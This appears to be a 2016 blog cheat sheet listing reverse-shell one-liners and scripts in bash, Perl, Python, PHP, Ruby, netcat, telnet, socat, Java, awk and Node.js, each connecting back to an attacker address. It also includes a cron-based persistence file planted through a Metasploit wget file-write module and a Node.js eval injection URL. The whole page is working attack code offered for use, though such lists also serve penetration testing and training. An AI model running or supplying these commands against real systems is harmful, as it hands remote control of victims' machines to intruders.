---
title: Reverse shell Cheat Sheet
date: 2016-06-19 02:00:20
tags: reverse shell
---

### nc
```
> nc -l -vv -p <PORT>
```
### Bash
```
> bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

> exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do $line 2>&5 >&5; done

> exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0 0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196
```
### TCLsh
```
#!/usr/bin/tclsh
set s [socket <IP> <PORT>];
while {42} {
puts -nonewline $s "shell>";
flush $s;
gets $s c;
set e "exec $c";
if {![catch {set r [eval $e]} err]} {
puts $s $r;
}
flush $s;
}
close $s;
```
```
> echo 'set s [socket <IP> <PORT>];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
```

### Perl
```
> perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
> perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
> perl -MIO -e "$c=new IO::Socket::INET(PeerAddr,'<IP>:<PORT>');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"
```
### Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
### PHP
```
> php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
> php -r '$s=fsockopen("<IP>",<PORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
> php -r '$s=fsockopen("<IP>",<PORT>);`/bin/sh -i <&3 >&3 2>&3`;'
> php -r '$s=fsockopen("<IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");'
> php -r '$s=fsockopen("<IP>",<PORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```
### Ruby
```
> ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
> ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
> ruby -rsocket -e "c=TCPSocket.new('<IP>','<PORT>');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"
```

### Netcat
```
nc <IP> <PORT> -e /bin/bash
/bin/nc.traditional <IP> <PORT> -e /bin/bash
/bin/nc.traditional <IP> <PORT> -c /bin/bash
```
via mkfifo
```
> rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc <IP> <PORT> > f
> rm f;mkfifo f;cat f|/bin/sh -i 2>&1|/bin/nc.openbsd <IP> <PORT> > f
```
via mknod
```
> rm -f x; mknod x p && nc <IP> <PORT> 0<x | /bin/bash 1>x
> rm -f x; mknod x p && /bin/nc.openbsd <IP> <PORT> 0<x | /bin/bash 1>x
```
### Telnet
> 本地监听

```
> nc -lvvp port1
> nc -lvvp port2
```
> 服务器执行

```
> telnet <IP> <PORT1> | /bin/bash | telnet <IP> <PORT2>
```
via mkfifo
```
> rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet <IP> <PORT> > f
```
via mknod
```
rm -f x; mknod x p && telnet <IP> <PORT> 0<x | /bin/bash 1>x
```
### Socat
```
> socat tcp-connect:<IP>:<PORT> exec:"bash -li",pty,stderr,setsid,sigint,sane
```
### Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
### xterm
```
> Xnest :1
> xhost +<IPTARGET>
```
```
> xterm -display <IP>:1
```
```
> /usr/openwin/bin/xterm -display <IP>:1
```
### awk
```
#!/usr/bin/awk -f
BEGIN {
s = "/inet/tcp/0/<IP>/<PORT>"
while(42) {
do{
printf "shell>" |& s
s |& getline c
if(c){
while ((c |& getline) > 0)
print $0 |& s
close(c)
}
} while(c != "exit")
close(s)
}
}
```
```
> awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### wget
> 首先我们先建立一个计划任务文件

```
cat>cronshell <<EOD
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root bash -c '<&112-;exec 112<>/dev/tcp/ 192.168.220.128/4444;sh <&112 >&112 2>&112'                             
EOD
```
> metasploit

```
> use exploit/multi/handler
> set PAYLOAD cmd/unix/reverse_bash
> set LHOST <IP>
> set LPORT 4444
> run -j
```
> 搭建一个攻击ftp

```
> use auxiliary/server/wget_symlink_file_write
> set TARGET_FILE /etc/cron.d/cronshell
> set TARGET_DATA file:cronshell
> set SRVPORT 21
> run
```
### Node.js
> reverse_shell.js

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```
```
http://blog.safebuff.com/?name=["./;eval(new Buffer('PAYLOAD', 'hex').toString());//*"]
```
